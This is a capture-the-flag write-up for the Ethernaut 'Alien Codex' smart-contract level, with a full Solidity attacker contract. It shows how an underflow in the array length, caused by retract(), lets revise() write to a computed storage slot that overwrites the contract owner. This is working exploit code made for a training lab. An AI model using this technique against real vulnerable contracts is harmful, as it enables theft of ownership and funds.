# Alien Codex Ethernaut

## Goals

=> You've uncovered an Alien contract. Claim ownership to complete the level.

### Hints

- Understanding how array storage works

- Understanding ABI specifications

- Using a very underhanded approach

### Solution

- Owner is stored in the 0th Storage slot, when `make_contact()` is being called the boolean `contact` get's also stored in the 0th storage slot

- Our (length of the) codex array is stored in the slot 1 so we can calculate where our array will actually be stored since it's a dynamic array we can calculate the slot by taking the `keccak256` of slot 1 which gives us `80084422859880547211683076133703299733277748156566366325829078699459944778998` here the first value will get stored if we decide to put in values

- By calling the `retract()` function we can achieve an underflow since there is no safeMath library & the solidity version < 0.8, so now our array will be `type(uint256).max` long

- Now we can write to an arbitrary slot with the `revise()` function, we are able to calculate the slot which will over flow by subtracting `80084422859880547211683076133703299733277748156566366325829078699459944778998` from `type(uint256).max + 1` which will result in `35707666377435648211887908874984608119992236509074197713628505308453184860938` that will cause an overflow and the storage slot we write to now is 0 where the owner is stored.

- So by calling `revise()` with the index of our calculated slot, and our address padded with zeros like so `0x000000000000000000000000e4064d8E292DCD971514972415664765e51B5364` we will overwrite slot 0 of the conrtract with our address as the new owner

### Attacker Contract

```solidity
contract Hack {
    // So we retrieved the storage slot we will start at which is the keccak256 of the storrage slot (1) =>
    // 80084422859880547211683076133703299733277748156566366325829078699459944778998
    // and the following is the Max of a uint256
    // 115792089237316195423570985008687907853269984665640564039457584007913129639935
    // so we need to write to that storage slot + 1 to land on the 0th storage slot where "owner" is stored
    // to cause an overflow on the storage we can change the owner which is stored and packed together with the
    // "contact" boolean we could theoretically achieve that by writing to the
    // (115792089237316195423570985008687907853269984665640564039457584007913129639935 + 1)
    // - 80084422859880547211683076133703299733277748156566366325829078699459944778998 = x
    // => x = 35707666377435648211887908874984608119992236509074197713628505308453184860938 th slot
    // and put in our address padded to 32 bytes + the slot into the revise function

    // Step 1: call make_contact()
    // Step 2: call retract()
    // Step 3: call revise with the calculated slot x from above and your address padded with zeros to the left to 32 bytes

    AlienCodex public target;
    uint256 constant ATTACK_NUMBER =
        35707666377435648211887908874984608119992236509074197713628505308453184860938;
    bytes32 constant MY_ADDRESS_PADDED =
        0x000000000000000000000000e4064d8E292DCD971514972415664765e51B5364;

    constructor(address _alienCodex) public {
        target = AlienCodex(_alienCodex);
        target.make_contact(); // set boolean to be able to interact with contract
        target.retract(); // make it underflow so the length of the array is sufficient that we can access the ATTACK_NUMBER th slot
    }

    // Now revise the ATTACK_NUMBER th slot and put in the address padded with zeros
    function attack() external {
        target.revise(ATTACK_NUMBER, MY_ADDRESS_PADDED);
    }
}
```
